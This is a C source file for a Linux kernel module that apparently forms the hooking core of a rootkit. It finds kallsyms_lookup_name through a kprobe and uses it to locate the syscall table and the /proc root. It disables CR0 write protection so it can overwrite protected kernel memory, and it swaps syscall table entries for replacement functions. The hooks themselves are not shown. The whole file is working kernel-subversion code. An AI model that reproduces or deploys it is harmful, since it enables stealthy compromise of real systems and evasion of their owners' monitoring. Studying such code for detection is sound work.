#include "hooking.h"

#include "macro_utils.h"
#include <asm-generic/errno-base.h>
#include <asm/processor-flags.h>
#include <asm/special_insns.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>

kallsyms_t lookup_name           = NULL; // Function pointer for `kallsyms_lookup_name()`.
static sysfun_t *p_syscall_table = NULL; // Pointer to the syscall table.

static proc_dir_entry_t *p_proc_root     = NULL; // Pointer to the /proc root directory.
static pde_subdir_find_t pde_subdir_find = NULL; // Function pointer for `pde_subdir_find()`.

/**
 * Writes the given value to the CR0 register.
 *
 * @param ui64_val The value to write
 */
static inline void cr0_write(unsigned long ui64_val)
{
    asm volatile("mov %0,%%cr0" : "+r"(ui64_val) : : "memory");
}

/**
 * Unprotects memory by clearing the WP (write-protected) bit of the CR0 register.
 *
 * @return The original value of the CR0 register
 */
static inline unsigned long unprotect_memory(void)
{
    unsigned long ui64_orig_cr0 = 0;
    unsigned long ui64_new_cr0  = 0;

    ui64_orig_cr0 = native_read_cr0();             // in special_insns.h
    ui64_new_cr0  = ui64_orig_cr0 & ~(X86_CR0_WP); // in processor-flags.h
    cr0_write(ui64_new_cr0);
    return ui64_orig_cr0;
}

/**
 * Restores the original value of the CR0 register.
 *
 * @param ui64_orig_cr0 The original value of the CR0 register
 */
static inline void protect_memory(const unsigned long ui64_orig_cr0)
{
    cr0_write(ui64_orig_cr0);
}

void change_protected_value(void *const p_addr, void *const p_new_val)
{
    unsigned long ui64_orig_cr0 = unprotect_memory();

    *(void **)p_addr = p_new_val;

    protect_memory(ui64_orig_cr0);
}

int __init init_hooking(void)
{
    int i32_err = 0;

    // Declare what we need to find
    struct kprobe probe = {
        .symbol_name = KALLSYMS_NAME,
    };

    IF_U (lookup_name != NULL) {
        pr_dev_err("Hooking module already initialized.\n");
        return -EALREADY;
    }

    i32_err = register_kprobe(&probe);
    IF_U (i32_err) {
        pr_dev_err("Failed to get kallsyms_lookup_name() address.\n");
        return i32_err;
    }

    // Function pointer type of kallsyms_lookup_name()
    lookup_name = (kallsyms_t)(probe.addr);
    pr_dev_info("kallsym_lookup_name() address: %p\n", lookup_name);

    // Cleanup kprobe as we don't need it anymore
    unregister_kprobe(&probe);

    // Find syscall table address
    p_syscall_table = lookup_name(SYS_CALL_TABLE_NAME);
    IF_U (p_syscall_table == NULL) {
        pr_dev_err("Failed to get sys_call_table address.\n");
        return -ENOENT;
    }

    pr_dev_info("Syscall table address: %p\n", p_syscall_table);

    // Find /proc root directory
    p_proc_root = lookup_name("proc_root");
    IF_U (p_proc_root == NULL) {
        pr_dev_err("Failed to get /proc root directory entry address.\n");
        return -ENOENT;
    }

    pr_dev_info("/proc root directory entry address: %p\n", p_proc_root);

    // Find pde_subdir_find() address
    pde_subdir_find = lookup_name("pde_subdir_find");
    IF_U (pde_subdir_find == NULL) {
        pr_dev_err("Failed to get pde_subdir_find() address.\n");
        return -ENOENT;
    }

    pr_dev_info("pde_subdir_find() address: %p\n", pde_subdir_find);

    return 0;
}

sysfun_t get_syscall_entry(const size_t sz_syscall_nr)
{
    return p_syscall_table[sz_syscall_nr];
}

void set_syscall_entry(const size_t sz_syscall_nr, const sysfun_t new_sysfun)
{
    unsigned long ui64_orig_cr0 = unprotect_memory();

    p_syscall_table[sz_syscall_nr] = new_sysfun;

    protect_memory(ui64_orig_cr0);
}

int hook_syscall(hook_t *const p_hook)
{
    pr_dev_info("Hooking syscall %zu\n", p_hook->sz_syscall_nr);

    *(p_hook->p_orig_sysfun) = get_syscall_entry(p_hook->sz_syscall_nr);
    set_syscall_entry(p_hook->sz_syscall_nr, p_hook->new_sysfun);

    return 0;
}

void unhook_syscall(const hook_t *const p_hook)
{
    pr_dev_info("Unhooking syscall %zu\n", p_hook->sz_syscall_nr);

    set_syscall_entry(p_hook->sz_syscall_nr, *(p_hook->p_orig_sysfun));
}

int __init hook_syscalls(hook_t p_hooks[])
{
    int i32_err = 0;
    size_t i;

    for (i = 0; p_hooks[i].new_sysfun != NULL; ++i) {
        i32_err = hook_syscall(&p_hooks[i]);
        IF_U (i32_err) {
            pr_dev_err("Failed to hook syscall %zu (n. %zu)\n", p_hooks[i].sz_syscall_nr, i);

            // Rollback previous hooks before returning the error
            while (i > 0) {
                i -= 1;
                unhook_syscall(&p_hooks[i]);
            }

            return i32_err;
        }
    }

    return 0;
}

void __exit unhook_syscalls(const hook_t p_hooks[])
{
    size_t i;

    for (i = 0; p_hooks[i].new_sysfun != NULL; ++i) {
        unhook_syscall(&p_hooks[i]);
    }
}

proc_dir_entry_t *get_proc_entry(const char *const s_name)
{
    if (p_proc_root == NULL) {
        return NULL;
    }

    return pde_subdir_find(p_proc_root, s_name, strlen(s_name));
}
